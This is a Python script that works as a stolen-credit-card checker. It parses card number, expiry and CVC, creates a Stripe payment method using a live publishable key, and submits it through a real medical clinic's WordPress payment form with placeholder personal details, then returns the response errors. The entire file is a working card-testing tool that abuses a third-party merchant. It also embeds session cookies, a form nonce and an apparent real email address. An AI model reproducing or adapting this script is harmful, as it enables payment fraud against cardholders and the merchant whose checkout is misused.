import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
	}

	headers = {
            'authority': 'g-pg.com.au',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
            'origin': 'https://g-pg.com.au',
            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1729922956202',
	}

	data = {
            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '5',
	}
	
	r2 = requests.post(
			'https://g-pg.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json()['errors'])